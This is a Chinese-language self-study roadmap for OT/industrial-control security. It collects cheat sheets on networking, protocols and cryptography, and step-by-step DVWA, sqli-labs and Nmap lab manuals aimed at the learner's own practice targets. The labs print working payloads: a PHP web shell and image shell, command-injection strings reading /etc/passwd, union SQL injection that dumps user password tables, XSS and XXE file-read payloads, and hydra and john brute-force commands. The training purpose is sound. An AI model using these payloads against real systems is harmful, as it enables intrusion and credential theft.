## OT（工控）安全 学习路线 —— 2026-10-06 起

### 0. 先说三条现实（比技术更重要）

1. **OT 安全岗几乎不招"纯 OT"的应届生。** 招聘里的"工控安全工程师"，默认你已经会 IT 安全基本功（网络、Linux、Web 渗透），OT 是你的加分项，不是敲门砖。所以正确的顺序是：**IT 安全打底（主线）→ OT 特色（差异化）**，不是反过来。
2. **这个方向的好处是"你的组合很稀缺"。** 纯 IT 安全的人不懂 PLC 和 Modbus，纯工控的人不懂攻击。你机械制造及自动化 + 能写代码 + 肯学安全，正好卡在中间。企业要的就是这种"能和现场工程师对话的安全人"。
3. **底线（红线，不能碰）**：所有扫描、利用、抓包，只能在**自己的靶场、自己搭的仿真、或拿到书面授权的项目**上做。对真实工业系统做未授权测试是刑事风险（刑法 285/286 条）。你的简历上如果有"未授权渗透某网站"这种经历，是减分甚至致命项。**只打自己的靶场。**

---

### 1. 能力地图（四层，从下往上建）

| 层 | 内容 | 你现在的状态 |
|---|---|---|
| L1 基础 | TCP/IP、交换路由、VLAN、防火墙；Linux 命令；Windows；Python | Python 走完大半，网络/Linux 没开始 |
| L2 IT 安全 | Web 安全（SQL 注入/XSS/文件上传/命令执行）、Nmap/Burp/Wireshark、日志与应急、等保基础 | 有资料没实操 |
| L3 OT 领域 | PLC 与梯形图（懂逻辑才懂攻击）、Modbus/DNP3/OPC UA/S7、SCADA/HMI、IT/OT 边界与工业网络架构、IEC 62443 / 等保 2.0 工控扩展 | 零 |
| L4 OT 安全实战 | 工控资产测绘、工控协议解析、PLC 攻击与防护、蜜罐（Conpot）、仿真靶场（OpenPLC / GRFICS v2）、ATT&CK for ICS | 零 |

**核心判断**：L1、L2 全部可以在你自己的电脑上自学（靶场 + CTF）；L3、L4 用 OpenPLC 这类软件 PLC 也能做八成。**没有硬件不是硬门槛**，但"碰过真机"是简历上的加分，第 4 节给了三条路。


规则：睡觉前写，不超过 5 分钟。断更 1 天第二天补上；断更 3 天要重新起势，代价很大。

### 二、每周复盘（周日，10 分钟，三个问题）

1. 这周产出了什么**能给别人看的东西**？
2. 这周哪一步最想跳过？（想跳过的，往往是最该练的）
3. 下周砍掉哪件事？

### 三、第 1 课：今晚就能做（Kali 装好后 40 分钟）

#### 第一段：5 条命令（15 分钟）

1. `whoami` —— 我是谁
2. `pwd` —— 我在哪
3. `ls -la` —— 这目录有什么（含隐藏文件）
4. `cd /var/log && tail -20 auth.log` —— 去日志目录看最近 20 行登录日志
5. `sudo apt update` —— 更新软件源

验收：每条都敲一遍，能说出输出在讲什么。

#### 第二段：第一个漏洞实验（25 分钟）

目标：用 SQL 注入登录 DVWA（Low 难度）。

1. 把 DVWA 跑起来（XAMPP 或 docker，参考路线文件第 2 周）
2. 浏览器打开 DVWA → Security 调成 Low → 进 SQL Injection 关卡
3. 输入框填：`' OR '1'='1`（引号照抄，前后共 4 个单引号）
4. 回车 → 出现全部用户信息 = 注入成功
5. 原理一句话：你的输入被直接拼进 SQL 语句，`'1'='1'` 永远为真，登录条件被绕开
6. 记下：这是你人生第一个漏洞。**截图，写进今晚的打卡。**

完成标准：能用自己的话讲 30 秒"为什么 `' OR '1'='1` 能过"。
讲不清楚 → 去查"SQL 注入 原理"，看完回来再讲一次。

#### 提醒

- 只在 DVWA 这种**自己的靶场**里做。对任何不属于你的网站用这个 payload，是犯罪。
- 装环境卡住了很正常，把报错截图记进打卡的"卡在哪"一栏，下次直接对着报错解决。

```
漏洞：CVE 编号 / 名字
影响：打谁、怎么打
防御：一条可执行措施
```

攒 50 张卡片 = 你的私人漏洞库。面试说"我有个自己维护的漏洞卡片库"，比说"我关注安全新闻"强十倍。

### 4. 和你的主线联动

- 看到"某 PLC 漏洞"→ 存进 （见本文件【30_工控安全面试专题20题.md】一节） 旁边的笔记
- 看到"某勒索事件"→ 对着 （见本文件【27_应急响应手册.md】一节） 想一遍怎么处置
- 看到英文标题 → 不认识的技术词抄进英语词表

### 5. 三条纪律

1. 只看不传：不转未经证实的"爆料"，面试时讲公开事件
2. 只看不碰：看漏洞 ≠ 去复现别人的目标
3. 别刷上瘾：每天就 10 分钟，超时关掉。你的主业是动手，不是刷资讯

## Linux 命令速查卡（每天背 5 条，两周过一遍）

### 文件与目录

| 命令 | 干什么 |
|---|---|
| `ls -la` | 列文件（含隐藏） |
| `cd /var/log` | 进目录 |
| `pwd` | 我在哪 |
| `cp -r 源 目标` | 复制（目录要 -r） |
| `mv 源 目标` | 移动/改名 |
| `mkdir -p a/b/c` | 建多层目录 |
| `touch 文件` | 新建空文件 |
| `cat 文件` | 看文件全文 |
| `less 文件` | 翻页看大文件（q 退出） |
| `head -20 文件` / `tail -20 文件` | 看头/尾 20 行 |
| `tail -f 文件` | 实时跟着看（盯日志用） |
| `grep -rn "关键词" 目录` | 在目录里搜关键词（最常用） |
| `find / -name "*.php" 2>/dev/null` | 全盘找文件 |

|---|---|

# 9. 【09_网络协议速查表.md】

## 网络协议速查表（面试必问 + 抓包对照）

### 1. 分层模型（先背这个）

| OSI 七层 | TCP/IP 四层 | 设备 | 典型协议 |
|---|---|---|---|
| 应用层 | 应用层 | 防火墙/网关 | HTTP/DNS/FTP/SSH |
| 表示层 | ↑ | | |
| 会话层 | ↑ | | |
| 传输层 | 传输层 | 防火墙 | TCP/UDP |
| 网络层 | 网络层 | 路由器 | IP/ICMP/ARP |
| 数据链路层 | 网络接口层 | 交换机 | Ethernet |
| 物理层 | ↑ | 网线/集线器 | 电信号 |

面试说 TCP/IP 四层（应用/传输/网络/网络接口），别背七层全名，记住"物理层=网线，交换机=二层，路由器=三层"。

### 2. TCP 三次握手 / 四次挥手

三次握手：客户端 SYN → 服务端 SYN+ACK → 客户端 ACK（问："能听见吗？""能，你呢？""能。"）
四次挥手：FIN → ACK → FIN → ACK（双向关闭各两次）

**为什么三次**：双方都要确认"我的发、我的收"都通。两次只够一方确认。

### 3. 常见端口表（面试至少说得出 10 个）

| 端口 | 协议 | 用途 |
|---|---|---|
| 80 | HTTP | 网页（明文） |
| 443 | HTTPS | 网页（加密） |
| 22 | SSH | 远程登录 Linux |
| 23 | Telnet | 远程登录（明文，危险） |
| 21/20 | FTP | 文件传输 |
| 25 | SMTP | 发邮件 |
| 53 | DNS | 域名解析（UDP 为主） |
| 67/68 | DHCP | 自动分配 IP |
| 445 | SMB | Windows 文件共享（永恒之蓝就在这） |
| 3389 | RDP | Windows 远程桌面 |
| 3306 | MySQL | 数据库 |
| 1433 | MSSQL | 数据库 |
| 6379 | Redis | 缓存（未授权访问高发） |
| 389 | LDAP | 目录服务 |

### 4. 工控协议端口表（你的差异化考点，必背）

| 端口 | 协议 | 备注 |
|---|---|---|
| 502 | Modbus TCP | 无认证无加密 |
| 102 | S7comm | 西门子 S7-300/400/1200/1500 |
| 44818 | EtherNet/IP | 罗克韦尔 |
| 4840 | OPC UA | 有安全模型，较新 |
| 20000 | DNP3 | 电力 |
| 47808 | BACnet | 楼宇自控 |
| — | Modbus RTU | 走串口（RS485），不占端口 |

面试加分句：**"IT 协议先保密，OT 协议先保命——Modbus 设计年代没考虑恶意网络，默认信任，这是工控安全的根问题。"**

### 5. HTTP 报文与状态码

请求结构：请求行（方法+路径+版本）→ 请求头 → 空行 → 请求体。
常考请求头：`User-Agent`（浏览器指纹）、`Cookie`（会话）、`Referer`（从哪来）、`Content-Type`（数据格式）。

| 状态码 | 含义 |
|---|---|
| 200 | 成功 |
| 301/302 | 跳转（302 常被用于登录后重定向） |
| 400 | 请求有错 |
| 401 | 未认证 |
| 403 | 没权限 |
| 404 | 不存在（扫描时大量 404 = 有人在扫目录） |
| 500 | 服务器报错（注入报错常在这暴露） |
| 502 | 网关错误 |

### 6. DNS 解析过程（简述版）

浏览器缓存 → 系统 hosts → 本地 DNS 服务器 → 递归查根域/顶级域/权威域 → 返回 IP 并缓存。

### 7. ARP 一句话

同网段通信靠 MAC，ARP 就是"谁知道 192.168.1.1 的 MAC 是什么"的广播问答。**没有验证机制 → 谁都能冒充网关回答（ARP 欺骗）**。

### 8. 面试标准答法：TCP 和 UDP 区别

"TCP 面向连接、可靠（三次握手、重传、有序），适合网页/文件；UDP 无连接、快但可能丢包，适合直播/视频通话/DNS。攻击者角度：UDP 更容易伪造源地址，TCP 有握手可做 SYN Flood。"

### 9. Wireshark 过滤器速查

| 过滤器 | 抓什么 |
|---|---|
| `ip.addr==192.168.1.10` | 某 IP 的全部流量 |
| `tcp.port==80` | 某端口的流量 |
| `http` / `dns` / `icmp` | 按协议 |
| `tcp.flags.syn==1` | 只看握手包 |
| `mbtcp` | Modbus TCP |
| `s7comm` | 西门子 S7 |

用法：背 5 个常用的，抓包时先 `ip.addr==靶机` 再逐步缩小。

# 10. 【10_密码学与编码速记.md】

## 密码学与编码速记（面试 + CTF 都考）

### 1. 三件事先分清（面试必考第一题）

| 类型 | 特点 | 例子 |
|---|---|---|
| **编码** | 可逆、无密钥、不是加密 | Base64、Hex、URL 编码 |
| **加密** | 要密钥、可逆 | AES（对称）、RSA（非对称） |
| **哈希** | 定长、单向不可逆 | MD5、SHA-1、SHA-256 |

标准答法："Base64 是编码不是加密，因为它没有密钥、任何人都能解开；加密必须有密钥；哈希是单向的，用于存密码和校验完整性。"

### 2. 一眼识别（看到密文先判断）

| 长相 | 是什么 |
|---|---|
| 结尾有 `=` 或 `==`，字母大小写混合 | Base64 |
| `0x` 开头或全是 0-9a-f | Hex |
| 32 位 0-9a-f | 可能是 MD5 |
| 40 位 0-9a-f | 可能是 SHA-1 |
| 64 位 0-9a-f | 可能是 SHA-256 |
| `%2f%3a` 这种 | URL 编码 |

### 3. 常用命令（Kali 一行搞定）

```bash
echo -n "hello" | base64            # 编码
echo "aGVsbG8=" | base64 -d         # 解码
echo -n "hello" | md5sum            # MD5
echo -n "hello" | sha256sum         # SHA-256
echo -n "hello" | xxd -p            # 转 hex
```

### 4. 对称 vs 非对称（面试必考）

- **对称**（AES/DES）：一把钥匙，加密解密都用它。快，但"钥匙怎么安全地给对方"是难题。
- **非对称**（RSA）：公私钥一对。公钥加密、私钥解密；反过来用就是**签名**。慢，所以 HTTPS 是"用非对称交换密钥 + 用对称加密数据"。

### 5. RSA 在 CTF 里怎么考（入门级）

- **考点一**：N 太小 → 用 yafu/factordb 分解出 p、q → 按公式算出私钥
- **考点二**：公钥 e 太小（如 e=3）且密文不够大 → 直接开方
- 入门题都有现成工具和 WriteUp，看懂公式 `m = c^d mod n` 就行

### 6. 古典密码（CTF 常客）

- 凯撒：字母统一平移（用工具暴力试 26 种）
- 栅栏：把明文排成 N 列再横着读
- 摩斯：`-` 和 `.` 的点划组合
- 猪圈密码、培根密码：图形/AB 组合，见到就搜图对照

### 7. 密码破解（拿到哈希怎么办）

```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > h.txt
john --wordlist=/usr/share/wordlists/rockyou.txt h.txt
john --show h.txt
```
秒出 = 弱口令（rockyou 里有）；出不来 = 加盐或强密码，换思路。

### 8. 面试加分句

"密码学我只学到'用得对'：存密码用哈希加盐（bcrypt），传数据用 TLS，判断密文类型会看长相。深度算法我不装懂。"
——这句比硬背 RSA 公式更讨面试官喜欢。

# 12. 【12_渗透实验手册_DVWA四类漏洞.md】

## 渗透实验手册：DVWA 四类漏洞（照做就能通关）

> 只在 DVWA 这类自己的靶场里做。本手册所有 payload 只用于靶场。

### 0. 环境准备（一次配好）

方式一（推荐，Docker）：
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
浏览器打开 http://127.0.0.1 → 进 /setup.php → 点 Create/Reset Database。

方式二（XAMPP）：下载 DVWA 源码解压到 htdocs/dvwa，改 config.inc.php 里的密码，同样走 /setup.php。

登录：账号 `admin`，密码 `password`。
第一件事：左边栏 DVWA Security → 调到 **Low**。

### 1. SQL Injection

**目标**：不用密码查出全部用户。

手注三步：
1. 输入框填 `'` 回车 → 报错 = 有注入点（不报错也没事，继续）
2. 填 `' OR '1'='1` → 出现全部用户信息 = 登录条件被绕开
3. 进阶（union 注入）：填 `1' UNION SELECT user,password FROM users#`
   → 直接拖出账号密码哈希

工具版（sqlmap，先按 F12 拿 cookie）：
```
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=你的会话" --dbs
```

**原理一句话**：输入被直接拼进 SQL，引号把原语句截断，后面跟着攻击者自己的 SQL。
**怎么防**：参数化查询（预编译语句），永远不拼字符串。

### 2. XSS

反射型（/vulnerabilities/xss_r/）：
输入 `<script>alert(document.cookie)</script>` → 弹窗显示 cookie = 成功。

存储型（/vulnerabilities/xss_s/）：
在留言框输入 `<script>alert(1)</script>` → 之后每次有人打开页面都弹 = 成功（存在数据库里）。

**原理一句话**：页面把用户输入当代码执行了，反射型"一次性"，存储型"永久生效"。
**怎么防**：输出编码（把 `<` 变成 `&lt;`）、CSP 策略。

### 3. File Upload

**目标**：传一个网页木马上去。

1. 新建 `shell.php`，内容：`<?php echo shell_exec($_GET['cmd']); ?>`
2. Low 难度直接上传（不限类型）
3. 访问 `http://127.0.0.1/hackable/uploads/shell.php?cmd=whoami` → 回显 www-data = 成功
4. 再用 `?cmd=ls -la /` 看根目录

**原理一句话**：服务器没检查文件类型，php 文件被执行成代码。
**怎么防**：校验类型+内容、重命名、上传目录禁执行、最小权限。

### 4. Command Injection

**目标**：让 ping 命令后面执行你的命令。

在输入框依次试（填目标 IP 那栏）：
```
127.0.0.1; whoami
127.0.0.1 | ls -la
127.0.0.1 && cat /etc/passwd
```
回显里出现额外命令结果 = 成功。

**原理一句话**：程序把输入直接拼进 shell 命令，`;` `|` `&&` 用来接第二条命令。
**怎么防**：白名单校验 IP 格式、不拼字符串、不直接调 shell。

### 5. 通关后：调 Medium 再来一遍

把难度调 Medium，观察每关**过滤了什么**：

- SQL：输入框变成下拉数字 → 用 Burp 抓包改 id 再测
- XSS：`<script>` 被过滤 → 试 `<img src=x onerror=alert(1)>`
- 上传：检查 Content-Type → 用 Burp 把 `Content-Type` 改成 `image/jpeg` 再传
- 命令注入：`&&` `;` 被过滤 → 试 `|`

**这一遍比 Low 值钱**——你学的不再是 payload，是"绕过思路"。

### 常见坑

- 中文乱码：浏览器编码或改 db 配置，不影响实验
- sqlmap 扫不到：多半是 cookie 没带或难度没切 Low
- 上传后 404：确认目录拼对（DVWA 上传目录是 hackable/uploads）
- 改了代码没生效：重启 docker/XAMPP 的 Apache

### 完成标准

四关 Low + 四关 Medium 全通，且每关能说出"原理一句话"和"怎么防"。截图存档，写进打卡。

# 13. 【13_DVWA全关卡通关速查.md】

## DVWA 全关卡通关速查（12 个模块 × 4 档难度）

> 目标：Security 从 Low 一路打到 Impossible。每过一档，把"过滤了什么"记进打卡。
> 详细步骤看 （见本文件【12_渗透实验手册_DVWA四类漏洞.md】一节） 和 （见本文件【14_Web漏洞进阶实验手册.md】一节），这里是速查表。

### 1. Brute Force（爆破）

| 难度 | 怎么过 |
|---|---|
| Low | 随便爆：hydra/Intruder，看响应长度 |
| Medium | 加了 sleep(2)——爆破变慢而已，照爆 |
| High | 加了 CSRF token——Intruder 用 Recursive Grep 提取 token，或手测 |

### 2. Command Injection（命令注入）

| 难度 | 怎么过 |
|---|---|
| Low | `127.0.0.1; whoami` |
| Medium | `;` 和 `&&` 被过滤 → 用 `\|` |
| High | 过滤更多 → 看源码，找漏网（如 `\|` 后带空格） |

### 3. CSRF

| 难度 | 怎么过 |
|---|---|
| Low | 构造链接/页面，受害者点开即改密码 |
| Medium | 校验 Referer → 抓包看它怎么查的，改 URL 路径 |
| High | 加了 token → 概念题：token 是正解 |

### 4. File Inclusion（文件包含）

| 难度 | 怎么过 |
|---|---|
| Low | `?page=../../../../etc/passwd` |
| Medium | `../` 被过滤 → 用 `..//` 双写绕过 |
| High | 限定 `file` 开头 → `?page=file:///etc/passwd` 或 `file4.php` 技巧 |

### 5. File Upload（文件上传）

| 难度 | 怎么过 |
|---|---|
| Low | 直接传 `shell.php` |
| Medium | 改 `Content-Type: image/jpeg` |
| High | 图片马（`GIF89a` + php），或绕过扩展名过滤 |

### 6. SQL Injection

| 难度 | 怎么过 |
|---|---|
| Low | `' OR '1'='1` 万能密码 + union 拖库 |
| Medium | 下拉框数字型 → Burp 抓包改参数再注入 |
| High | 手注仍可行，只是查不出数据时换方法（limit 绕过） |

### 7. SQL Injection (Blind) 盲注

| 难度 | 怎么过 |
|---|---|
| Low | 布尔：`1' and 1=1#` vs `1' and 1=2#` |
| Medium/High | 时间盲注：`1' and sleep(5)#` |

### 8–9. XSS Reflected / Stored

| 难度 | 怎么过 |
|---|---|
| Low | `<script>alert(1)</script>` |
| Medium | `script` 被过滤 → `<img src=x onerror=alert(1)>` |
| High | 更严过滤 → 大小写/编码变体，或看源码找漏 |

### 10. Weak Session IDs

观察按钮点击生成的 session：Low 是 +1 递增（可预测别人的会话），Medium 是时间戳，High 是加密串——**目的是让你理解"会话 ID 必须不可预测"**。

### 11. Insecure CAPTCHA

验证码在**客户端**校验：Burp 抓包，直接把 `step=1` 改成 `step=2` 跳过验证——原理：客户端校验不可信。

### 12. CSP Bypass / Open Redirect

- CSP：给页面注入的 JS 被 Content-Security-Policy 拦了，试不满足的绕过或只做概念理解
- Open Redirect：登录后跳转参数没校验，`?redirect=https://evil.com`——原理：跳转目标要白名单

### 通关标准

12 个模块全部到 Impossible 或最高档（个别 Impossible 允许只做"看源码理解为什么打不动"）。
**每关记一行：过滤了什么 + 我怎么绕的。** 这张表做完，Web 安全基础就毕业了。

# 14. 【14_Web漏洞进阶实验手册.md】

## Web 漏洞进阶实验手册（DVWA Medium/High + 变体）

> 只打自己的靶场。进阶的核心不是背 payload，是理解"过滤了什么、怎么绕"。

### 1. XSS 绕过实验（Medium/High）

目标：DVWA XSS 关卡调到 Medium/High，弹窗成功。

| 难度 | 过滤了什么 | 绕过 payload |
|---|---|---|
| Medium | 去掉 `<script>` | `<img src=x onerror=alert(1)>` |
| High | 更严格的替换 | `<img src=x onerror=alert(1)`（少个尖括号）或大小写/编码变体 |

原理：过滤是"黑名单"，总有它没想到的写法——防御正解是**输出编码 + CSP**，不是黑名单。

### 2. 文件上传绕过实验（Medium/High）

| 难度 | 过滤了什么 | 绕过 |
|---|---|---|
| Medium | 检查 Content-Type | Burp 抓包，把 `Content-Type` 改成 `image/jpeg` |
| High | 检查文件头/扩展名 | 图片马：`GIF89a` + `<?php ... ?>`，存成 `.php.jpg` 或试 `.phtml/.php5` |

做一张图片马：
```
echo "GIF89a<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php.gif
```

### 3. 命令注入绕过实验

| 被过滤 | 绕过 |
|---|---|
| `;` 和 `&&` | 用 `\|` 或 `\|\|` |
| 空格 | `${IFS}` 代替空格，如 `cat${IFS}/etc/passwd` |
| 关键字 | 拼接：`ca""t`、`cat /etc/pass''wd` |

在 DVWA 的 Medium/High 逐级试，**把每级"过滤了什么"记在打卡里**。

### 4. CSRF 实验（DVWA 自带关卡）

目标：让"受害者"（你自己开另一个浏览器）在不知情下改密码。

1. DVWA → CSRF → Low
2. 看修改密码的请求长什么样（URL 里带 `password_new=xxx`）
3. 构造一条链接发给"受害者"点开 → 密码被改 = 成功
4. Medium/High 观察加了什么防御（Referer 校验、token）——token 是正解

### 5. SSRF 实验（本地模拟）

1. 本地起一个简单 HTTP 服务：`python -m http.server 8000`
2. 找一道 SSRF 靶场题（BUUCTF 或 Pikachu 里都有），或看 Pikachu 的 SSRF 关卡
3. 理解：让**服务器**去请求 `http://127.0.0.1:8000` 而不是你自己去——服务器能看到你看不到的内网

考点：探测内网端口、读云元数据 `169.254.169.254`。

### 6. XXE 实验（Pikachu 关卡）

构造 payload 读文件：
```xml
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<a>&xxe;</a>
```
提交到有 XXE 的接口 → 响应里出现 /etc/passwd = 成功。

### 7. 每做完一类的固定动作

1. 记下"过滤了什么 + 我用什么绕的"
2. 写出**防御正解**（不是更强的黑名单）
3. 截图标进度

### 8. 完成标准

五类（XSS/上传/命令注入/CSRF/SSRF/XXE）各自至少绕过一次过滤，且能说清"绕过原理 + 正确防御"。这套做完，Web 基础就算真正毕业了。

# 15. 【15_SQL注入进阶手册.md】

## SQL 注入进阶手册（从万能密码到 union 拖库）

> 只打自己的靶场（DVWA、sqli-labs）。对真实系统用下面的任何东西都是犯罪。

### 0. 一句话总纲

SQL 注入 = 程序把用户输入**拼进 SQL 语句**执行。你学会的所有技巧，本质都是：**截断原语句 + 补上自己的语句 + 处理掉尾巴**。

### 1. 判断有没有注入点

依次试（每步观察页面变化）：

1. 输入 `'` → 页面报错/变化 = 大概率有注入
2. `' and 1=1-- ` → 页面正常（条件真）
3. `' and 1=2-- ` → 页面异常（条件假）

第 2、3 步一个正常一个异常 = **确认注入**。
（`-- ` 是注释符，把后面的尾巴注释掉；注意 `--` 后面要带空格）

### 2. 猜列数（union 前必须）

```
' order by 1--   正常
' order by 2--   正常
' order by 3--   正常
' order by 4--   报错  ← 说明只有 3 列
```

原理：order by 按第 N 列排序，N 超出列数就报错。二分法找。

### 3. Union 注入四步拖库

假设查出来 3 列：

1. **找显示位**：`' union select 1,2,3-- ` → 看页面把 1、2、3 里哪个显示出来（比如显示 2，那 2 号位就是你的"窗口"）
2. **爆库名**：`' union select 1,database(),3-- ` → 显示当前库名
3. **爆表名**：
```
' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--
```
（limit 0,1 / 1,1 / 2,1……挨个翻）
4. **爆列名 + 拖数据**：
```
' union select 1,column_name,3 from information_schema.columns where table_name='users' limit 0,1--
' union select user,password,3 from users--
```

`information_schema` 是 MySQL 自带的"户口本"，所有库表列都登记在里面——注入要什么，都从它查。

### 4. 注释符和变体

- MySQL：`-- `（带空格）或 `#`
- 万能密码变体：`' or 1=1#`、`' or '1'='1`、`admin'-- `
- 空格被过滤时：用 `/**/` 代替空格，如 `'/**/union/**/select/**/1,2,3-- `

### 5. 盲注（页面不显示数据时）

**布尔盲注**（有变化，不显示内容）：
```
' and length(database())>5--   正常 → 库名超过 5 个字符
' and substr(database(),1,1)='a'--   逐位猜库名
```
**时间盲注**（完全没变化）：
```
' and sleep(5)--   页面 5 秒才回来 = 条件成立
```
盲注逐字符猜，慢但一定能猜完——所以盲注一般交给工具跑。

### 6. sqlmap 速查

```
sqlmap -u "URL?id=1" --cookie="security=low; PHPSESSID=xxx"   # 基础检测
sqlmap -u "URL?id=1" --cookie="..." --dbs                      # 列库
sqlmap -u "URL?id=1" --cookie="..." -D 库名 --tables           # 列表
sqlmap -u "URL?id=1" --cookie="..." -D 库名 -T 表名 --columns  # 列字段
sqlmap -u "URL?id=1" --cookie="..." -D 库名 -T 表名 --dump     # 拖数据
--batch      # 全程默认选项，不提问
--level 3 --risk 2   # 加大探测力度（必要时）
```

### 7. 防御（面试必考，抄下来）

**唯一正解：参数化查询。** 其他都是补充。

Python + sqlite3：
```python
cursor.execute("SELECT * FROM users WHERE name=?", (name,))
```
Python + pymysql：
```python
cursor.execute("SELECT * FROM users WHERE name=%s", (name,))
```

为什么能防：参数和 SQL 结构**分开发送**，输入永远只当"数据"，当不了"代码"。

补充三道防线：
1. 最小权限：Web 应用的数据库账号只给 SELECT/INSERT，不给 DROP
2. 报错不外显：线上环境关掉 SQL 报错回显
3. 白名单：id 这种参数，先校验"必须是数字"

### 8. 练习路径

1. DVWA SQL Injection：Low → Medium → High（看过滤了什么）
2. sqli-labs：第 1–10 关（union 系列全在这），然后 11–22 关（登录绕过/盲注）
3. 每关流程固定：手注成功 → 复述原理 → 再上 sqlmap → 对比两者结果

**完成标准**：sqli-labs 前 10 关能手注通关，且不看笔记能默写"order by 猜列数 → union 找显示位 → information_schema 拖库"这条链。

# 16. 【16_sqli-labs前10关详解.md】

## sqli-labs 前 10 关详解（注入从这里毕业）

> 环境：XAMPP + sqli-labs（GitHub 搜 Audi-1/sqli-labs），导入后访问 http://127.0.0.1/sqli-labs/
> 只打自己的靶场。`--+` 是注释符（等价 `-- `）。

### 每关通用流程（背下来）

**试闭合 → order by 猜列数 → union 找显示位 → 拖库**

### Less-1：GET 字符型（入门关）

闭合方式：`'`。完整链路：

```
?id=1'                          → 报错，确认注入
?id=1' order by 3--+            → 正常；4 报错 → 3 列
?id=-1' union select 1,2,3--+   → 显示位是 2、3
?id=-1' union select 1,database(),3--+
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

### Less-2：GET 数字型

和 Less-1 的区别：**参数是数字，不用引号闭合**。`?id=1 order by 3--+` 直接开始。识别方法：`?id=1'` 报错而 `?id=1 and 1=1` 正常 = 数字型。

### Less-3：字符型 + 括号

闭合方式：`')`。所以每个 payload 结尾用 `')` 开头部分补上：`?id=1') order by 3--+`。
识别方法：`?id=1'` 报错后看报错信息里的括号提示，或试 `?id=1')--+` 是否正常。

### Less-4：双引号 + 括号

闭合方式：`")`。`?id=1") union select 1,2,3--+`。
**前 4 关的目的：让你明白"闭合"两个字——每种闭合方式，就是一条新题。**

### Less-5 / Less-6：报错注入

页面不显示数据，但会**显示 SQL 报错**。用报错函数把数据"挤"进报错信息：

```
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```
Less-6 和 Less-5 一样，只是闭合从 `'` 变 `"`。

### Less-7：导出文件（概念关）

`into outfile` 把查询结果写成文件（需要数据库有写权限）：
```
?id=1')) union select 1,2,'<?php phpinfo();?>' into outfile '/var/www/html/x.php'--+
```
写不进去很正常（权限限制），**重点是搞懂原理**：能写文件 = 能拿 webshell。

### Less-8：布尔盲注

页面只有"正常/异常"两种状态，没有数据、没有报错。用真假判断逐字符猜：

```
?id=1' and length(database())=8--+          → 正常 = 库名 8 位
?id=1' and substr(database(),1,1)='s'--+    → 正常 = 第一个字符是 s
```

### Less-9 / Less-10：时间盲注

连真假变化都没有。用 sleep 把"真"变成"慢"：

```
?id=1' and if(length(database())=8,sleep(5),1)--+   → 页面 5 秒才回 = 判断成立
```
Less-10 是双引号闭合。

### 通关标准

- 前 4 关：能手注完整拖出 users 表（不查笔记）
- 5–6 关：理解"报错是信息通道"
- 8–9 关：理解盲注思路，能说出为什么"慢"
- 全程：每关记下**闭合方式**，10 关做完你就有了一张"闭合方式对照表"

做完前 10 关，（见本文件【15_SQL注入进阶手册.md】一节） 里的每一步你都亲手走过了。

# 17. 【17_Nmap与端口扫描手册.md】

## Nmap 与端口扫描手册

> Kali 自带 nmap。**只扫自己的靶机或拿到书面授权的目标**，扫互联网上的真实主机是违法取证的第一步。

### 1. 常用命令速查表

| 命令 | 干什么 | 什么时候用 |
|---|---|---|
| `nmap -sn 192.168.1.0/24` | 只发现存活主机（不扫端口） | 进内网第一步 |
| `nmap -sV 目标IP` | 端口 + 服务版本 | 摸清目标开什么服务 |
| `nmap -sC 目标IP` | 跑默认脚本 | 配合 -sV 用 |
| `nmap -p- 目标IP` | 全端口 1–65535 | 找非常规端口（耗时，谨慎） |
| `nmap -p 80,443,502,3306 目标IP` | 指定端口 | 快速验证 |
| `nmap -sS 目标IP` | SYN 半开扫描（要 root） | 默认最常用 |
| `nmap -sU --top-ports 20 目标IP` | UDP 扫描 | 找 DNS/SNMP 等 UDP 服务 |
| `nmap -O 目标IP` | 猜操作系统 | 信息收集 |
| `nmap -T4 目标IP` | 提速（T0–T5） | 内网靶场用 T4 |
| `nmap -Pn 目标IP` | 跳过 ping 直接扫 | 目标禁 ping 时 |
| `nmap -oA 结果名 目标IP` | 结果存盘（-oN 文本 / -oX XML） | 写报告用 |

### 2. 标准流程（背下来）

**存活 → 端口 → 服务版本 → 脚本深挖**

```bash
nmap -sn 网段                      # 1. 谁活着
nmap -sV -p- --min-rate 2000 目标   # 2. 开什么、什么版本（内网靶场可用）
nmap -sV -sC -p 目标端口 目标        # 3. 脚本深挖
```

### 3. 端口状态怎么看

- **open**：有服务在听（继续深挖）
- **filtered**：被防火墙拦（换端口/换协议/换手法）
- **closed**：没服务（跳过）

### 4. 工控脚本（你的差异化）

```bash
nmap --script modbus-discover -p 502 目标      # 发现 Modbus 设备
nmap --script s7-info -p 102 目标              # 西门子 S7 信息
nmap --script enip-info -p 44818 目标          # EtherNet/IP
nmap --script bacnet-info -p 47808 目标        # 楼宇 BACnet
nmap --script dnp3-info -p 20000 目标          # 电力 DNP3
```

只对你的 OpenPLC（502）和 Conpot（502/102）用——这周就能跑通，截图存进项目。

### 5. 面试高频题

1. **SYN 扫描原理？** 只发 SYN，收到 SYN+ACK 就判定开放、立刻发 RST 断开——不完成三次握手，所以叫"半开扫描"，隐蔽。需要 root 权限（构造原始包）。
2. **为什么扫描要限速？** 目标 IDS 会把高速扫描当攻击；`-T4` 是速度与隐蔽的折中。
3. **filtered 和 open 的区别？** filtered = 防火墙把探测包吃了，不代表没服务。

### 6. 配套练习（第 2 周做）

1. `nmap -sV 你自己的 Kali IP` —— 看自己开了什么（先认清自己）
2. 起 OpenPLC 后 `nmap -p 502 127.0.0.1` + modbus-discover —— 截图
3. 扫 Metasploitable2 靶机，对比 Kali 和靶机的开放端口差异

## 安全工具命令速查合集（复制即用）

> 全部只对自己的靶场用。每个工具记住"一条最常用命令"就够入门。

### hydra（爆破）

```bash
## SSH 爆破（只打自己的靶机）
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://靶机IP
## HTTP 表单爆破（DVWA 登录练习）
